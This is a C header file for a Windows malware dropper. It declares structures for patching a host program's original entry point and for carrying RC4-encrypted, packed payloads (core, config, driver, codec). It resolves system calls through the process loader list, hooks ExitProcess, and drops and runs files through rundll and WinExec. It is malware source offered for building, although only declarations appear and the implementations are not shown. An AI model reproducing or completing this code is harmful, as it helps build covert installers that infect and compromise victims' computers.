#ifndef _DROPPERCODE_H
#define _DROPPERCODE_H

#include <string>
using namespace std;

#include <Windows.h>
#include "smc.h"

enum {
	DATASECTION_ENDMARKER = 0x3E453C00,
};

enum {
	OEPSTUBSIZE = 31,
	ADDRBYTE1 = 6,
	ADDRBYTE2 = 5,
	ADDRBYTE3 = 8,
	ADDRBYTE4 = 10,
};

extern BYTE oepStub[OEPSTUBSIZE];

// STRINGS indexes

#define STRIDX_EXECUTABLE_NAME	0
#define STRIDX_INSTALL_DIR		1
#define STRIDX_TMP_ENVVAR		2
#define STRIDX_TEMP_ENVVAR		3
#define STRIDX_KERNEL32_DLL     4
#define STRIDX_MSVCRT_DLL		5
#define STRIDX_LOADLIBRARYA		6
#define STRIDX_GETPROCADDRESS	7
#define STRIDX_RUNDLL			8
#define STRIDX_COMMAHFF8		9
#define STRIDX_HFF5				10
#define STRIDX_DIRSEP			11
#define STRIDX_ERRORCREDIR		12
#define STRIDX_EXITPROCIDX		13
#define STRIDX_EXITPROCHOOKED   14
#define STRIDX_RESTOREOEP		15
#define STRIDX_EXITHOOKED		16
#define STRIDX_OEPRESTORED		17
#define STRIDX_CALLINGOEP		18
#define STRIDX_CREATEFILE_ERR   19
#define STRIDX_HFF5CALLING      20
#define STRIDX_HFF5CALLED	    21
#define STRIDX_INEXITPROC_HOOK  22
#define STRIDX_VECTORQUIT		23

/*
#define STRIDX_WRITING_DRVR		8



#define STRIDX_KERNEL32_DLL		12
#define STRIDX_EXITPROCESS		13
#define STRIDX_ADDRESS_HEX		14
#define STRIDX_LOADLIBRARYA		15
#define STRIDX_GETPROCADDRESS   16

#define STRIDX_RUNDLL			18
#define STRIDX_USERTEMP			19
#define STRIDX_USERTMP			20
#define STRIDX_BACKSLASH		21
#define STRIDX_COMMAHFF5		22
#define STRIDX_HFF5				23

#define STRIDX_ERRORCODE		25


#define STRIDX_MSVCRT_DLL		28
#define STRIDX_EXIT				29
#define STRIDX_STRLEN			30

#define STRIDX_OEP				32
#define STRIDX_ITD				33




*/

// DLL calls indexes

// KERNEL32.dll
#define	CALL_OUTPUTDEBUGSTRINGA 0
#define	CALL_CREATEFILEA		1
#define CALL_CREATEDIRECTORYA	2
#define CALL_CLOSEHANDLE		3
#define	CALL_WRITEFILE			4
#define CALL_READFILE			5
#define CALL_SETFILEPOINTER		6
#define CALL_GETMODULEFILENAMEW 7
#define	CALL_VIRTUALALLOC		8
#define CALL_VIRTUALFREE		9
#define CALL_VIRTUALPROTECT		10
#define CALL_WINEXEC			11
#define CALL_FREELIBRARY		12
#define CALL_GETENVIRONMENTVARIABLEA	13
#define CALL_SETCURRENTDIRECTORYA		14
#define CALL_SETFILEATTRIBUTESA			15
#define CALL_DEBUGACTIVEPROCESS			16
#define CALL_GETCURRENTPROCESSID		17
#define CALL_CREATETHREAD				18
#define CALL_GETTHREADCONTEXT			19
#define CALL_SETTHREADCONTEXT			20
#define CALL_GETFILESIZE				21
#define CALL_SLEEP						22
#define CALL_GETLASTERROR				23
#define CALL_EXITPROCESS				24
#define CALL_LOADLIBRARY				25
#define CALL_GETPROCADDRESS				26
#define CALL_VIRTUALQUERY				27
#define CALL_EXIT						29

// USER32.dll
#define CALL_SPRINTF					28

// #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
#define STRING(idx) strings + stringsOffsets[(idx)]
#define STRLEN(idx) _STRLEN_(STRING(idx))

// RC4
#define SBOX_SIZE 255
#define MAX_BUF_SIZE 1024
#define RC4KEYLEN 64

#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0)
#define RC4_CRYPT(buf, buf_len, key, key_len, header) rc4_skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)

typedef struct _data_section_blob {
	DWORD offset;
	DWORD size;
} DataSectionBlob;

typedef struct _data_section_cryptopack {
	DWORD offset;
	DWORD size;
	DWORD characteristics;
} DataSectionCryptoPack;

// DataSectionCryptoPack Characteristics

#define DSBCHAR_APLIB_PACKED	0x00000100
#define DSBCHAR_CRYPT_RC4		0x00001000

typedef struct _data_section_files {
	struct {
		DataSectionBlob core;
		DataSectionBlob config;
		DataSectionBlob driver;
		DataSectionBlob codec;		
	} names;
	
	DataSectionCryptoPack core;
	DataSectionCryptoPack config;
	DataSectionCryptoPack driver;
	DataSectionCryptoPack codec;
} DataSectionFiles;

typedef void (*WINSTARTFUNC)(void);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);

#define JMP_OPCODE_SIZE 5

typedef __declspec(align(4)) struct _data_section_header {
	
	// RC4
	// Encryption key
	CHAR rc4key[RC4KEYLEN];
	// SBox
	unsigned char gSBox[SBOX_SIZE + 1];
	
	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;
	
	// Synchronization
	DWORD synchro;

	// used to pass full qualified path to core thread
	CHAR *dllPath;
	
	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
	int exitProcessIndex;
	int exitIndex;
	
	// out own functions
	struct {
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob exitHook;
		DataSectionBlob rvaToOffset;
		//DataSectionBlob RC4InitSBox;
		//DataSectionBlob RC4Crypt;
		DataSectionBlob rc4;
	} functions;
	
	// strings
	DataSectionBlob stringsOffsets;
	DataSectionBlob strings;

	// dlls and addresses
	DataSectionBlob dlls;
	DataSectionBlob callAddresses;

	// appended files
	DataSectionFiles files;
	
	DataSectionBlob originalOEPCode;
	
} DataSectionHeader;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;

#pragma region REQUIRED_IMPORTS

typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader *header);
typedef DWORD (WINAPI * THREADPROC)(__in  LPVOID lpParameter);

typedef void (WINAPI *OUTPUTDEBUGSTRING)(__in_opt LPCTSTR lpOutputString);
typedef HANDLE (WINAPI *CREATEFILE)(__in	  LPCTSTR lpFileName,  
									__in      DWORD dwDesiredAccess,
									__in      DWORD dwShareMode,
									__in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
									__in      DWORD dwCreationDisposition,
									__in      DWORD dwFlagsAndAttributes,
									__in_opt  HANDLE hTemplateFile);
typedef BOOL (WINAPI * CREATEDIRECTORY)(
							__in      LPCTSTR lpPathName,
							__in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes
							);
typedef BOOL (WINAPI * CLOSEHANDLE)(
								__in  HANDLE hObject
								);
typedef BOOL (WINAPI * WRITEFILE)(
					  __in         HANDLE hFile,
					  __in         LPCVOID lpBuffer,
					  __in         DWORD nNumberOfBytesToWrite,
					  __out_opt    LPDWORD lpNumberOfBytesWritten,
					  __inout_opt  LPOVERLAPPED lpOverlapped
					  );
typedef DWORD (WINAPI * SETFILEPOINTER)(
									__in         HANDLE hFile,
									__in         LONG lDistanceToMove,
									__inout_opt  PLONG lpDistanceToMoveHigh,
									__in         DWORD dwMoveMethod
									);
typedef BOOL (WINAPI * READFILE)(
					 __in         HANDLE hFile,
					 __out        LPVOID lpBuffer,
					 __in         DWORD nNumberOfBytesToRead,
					 __out_opt    LPDWORD lpNumberOfBytesRead,
					 __inout_opt  LPOVERLAPPED lpOverlapped
					 );
typedef DWORD (WINAPI * GETMODULEFILENAME)(
									   __in_opt  HMODULE hModule,
									   __out     LPTSTR lpFilename,
									   __in      DWORD nSize
									   );
typedef LPVOID (WINAPI * VIRTUALALLOC)(
						   __in_opt  LPVOID lpAddress,
						   __in      SIZE_T dwSize,
						   __in      DWORD flAllocationType,
						   __in      DWORD flProtect
						   );
typedef BOOL (WINAPI * VIRTUALFREE)(
								__in  LPVOID lpAddress,
								__in  SIZE_T dwSize,
								__in  DWORD dwFreeType
								);
typedef BOOL (WINAPI * VIRTUALPROTECT)(
								   __in   LPVOID lpAddress,
								   __in   SIZE_T dwSize,
								   __in   DWORD flNewProtect,
								   __out  PDWORD lpflOldProtect
								   );
typedef UINT (WINAPI * WINEXEC)(
							__in  LPCSTR lpCmdLine,
							__in  UINT uCmdShow
							);
typedef BOOL (WINAPI * FREELIBRARY)(
								__in  HMODULE hModule
								);
typedef DWORD (WINAPI * GETENVIRONMENTVARIABLE)(
	__in_opt   LPCTSTR lpName,
	__out_opt  LPTSTR lpBuffer,
	__in       DWORD nSize
	);
typedef BOOL (WINAPI * SETCURRENTDIRECTORY)(
	__in  LPCTSTR lpPathName
	);

typedef BOOL (WINAPI * SETFILEATTRIBUTES)(
									  __in  LPCTSTR lpFileName,
									  __in  DWORD dwFileAttributes
									  );
typedef BOOL (WINAPI * DEBUGACTIVEPROCESS)(
									   __in  DWORD dwProcessId
									   );
typedef DWORD (WINAPI * GETCURRENTPROCESSID)(void);
typedef HANDLE (WINAPI * CREATETHREAD)(
								   __in_opt   LPSECURITY_ATTRIBUTES lpThreadAttributes,
								   __in       SIZE_T dwStackSize,
								   __in       LPTHREAD_START_ROUTINE lpStartAddress,
								   __in_opt   LPVOID lpParameter,
								   __in       DWORD dwCreationFlags,
								   __out_opt  LPDWORD lpThreadId
								   );
typedef BOOL (WINAPI * GETTHREADCONTEXT)(
									 __in     HANDLE hThread,
									 __inout  LPCONTEXT lpContext
									 ); 
typedef BOOL (WINAPI * SETTHREADCONTEXT)(
									 __in  HANDLE hThread,
									 __in  const CONTEXT *lpContext
									 );
typedef DWORD (WINAPI * GETFILESIZE)(
								 __in       HANDLE hFile,
								 __out_opt  LPDWORD lpFileSizeHigh
								 );
typedef void (WINAPI * SLEEP)(__in DWORD dwMilliseconds);

typedef DWORD (WINAPI * GETLASTERROR)(void); 

typedef VOID (WINAPI  * EXITPROCESS)(__in  UINT uExitCode);

typedef int (*SPRINTF)(      
					 CHAR* lpOut,
					 CHAR* lpFmt,
					 ...
					 );

typedef SIZE_T (WINAPI *VIRTUALQUERY)(
								   LPCVOID lpAddress,
								   PMEMORY_BASIC_INFORMATION lpBuffer,
								   SIZE_T dwLength
								   );

typedef void (__cdecl *EXIT)(_In_ int status);

typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);

typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
						 unsigned char *data, size_t data_len, DataSectionHeader *header);

#pragma endregion

#pragma region CUSTOM_INLINE_FUNCTIONS

// Important: Compiler must set /O2 (Maximize Speed) to ensure inline functions
// Although compiler provides #pragma intrinsic it is not 100% reliable

__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
{
	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
}

__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
{
	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
}

__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
{
	while ( _sz-- )
	{
		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
			return FALSE;
	}

	return TRUE;
}

__forceinline size_t _STRLEN_(char *_src)
{
	size_t count = 0;
	while( _src && *_src++ ) 
		count++;
	return count;
}

__forceinline void _TOUPPER_(char *s)
{
	for(; *s; s++)
		if(('a' <= *s) && (*s <= 'z'))
			*s = 'A' + (*s - 'a');
}

__forceinline  void _TOUPPER_CHAR(char *c)
{
	if((*c >= 'a') && (*c <= 'z')) 
		*c = 'A' + (*c - 'a');
}

__forceinline void _TOLOWER_(char *s)
{
	for(; *s; s++)
		if(('A' <= *s) && (*s <= 'Z'))
			*s = 'a' + (*s - 'A');
}

__forceinline int _STRCMP_(char *_src1, char *_src2)
{
	size_t sz = _STRLEN_(_src1);
	
	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
		return 1;
	
	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
}

__forceinline int _STRCMPI_(char *_src1, char *_src2)
{
	char* s1 = _src1;
	char* s2 = _src2;
	
	while (*s1 && *s2)
	{
		char a = *s1;
		char b = *s2;

		_TOUPPER_CHAR(&a);
		_TOUPPER_CHAR(&b);
		
		if (a != b)
			return 1;
		
		s1++;
		s2++;
	}
	
	return 0;
}

__forceinline char* _STRRCHR_(char const *s, int c)
{
	char* rtnval = 0;
	
	do {
		if (*s == c)
			rtnval = (char*) s;
	} while (*s++);
	return (rtnval);
}

__forceinline void _STRCAT_(char*_src1, char *_src2)
{
	char* ptr = _src1 + _STRLEN_(_src1);
	_MEMCPY_(ptr, _src2, _STRLEN_(_src2));
	ptr += _STRLEN_(_src2);
	*ptr = '\0';
}

__forceinline void _ZEROMEM_(char* mem, int size)
{
	for (int i = 0; i < size; i++)
		mem[i] = 0;
}

__forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length )
{
	for (DWORD i = 0; i < (length / 2); i++) {
		// char a = against[i]; _TOUPPER_CHAR(a);
		// char b = unicode[i*2]; _TOUPPER_CHAR(b);
		if ( ! _MEMCMP_(against + i, unicode + (i*2), 1))
			return false;
	}
	
	return true;
}

#pragma endregion 


// TODO change all _End function using macros

// *** Entry Point 
int __stdcall NewEntryPoint();
FUNCTION_END_DECL(NewEntryPoint);
// int __stdcall NewEntryPoint_End();

BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader* header);
FUNCTION_END_DECL(DumpFile);
// void __stdcall DumpFile_End(CHAR * fileName, CHAR* fileData, DWORD fileSize);

DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter);
FUNCTION_END_DECL(CoreThreadProc);
// DWORD WINAPI CoreThreadProc_End(__in  LPVOID lpParameter);

VOID WINAPI ExitProcessHook(__in  UINT uExitCode);
FUNCTION_END_DECL(ExitProcessHook);

__declspec(noreturn) VOID __cdecl ExitHook(_In_ int status);
FUNCTION_END_DECL(ExitHook);

void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
			  unsigned char *data, size_t data_len, DataSectionHeader *header);
FUNCTION_END_DECL(rc4_skip);

void generate_key(std::string& key, unsigned int length);

#endif /* _DROPPER_H */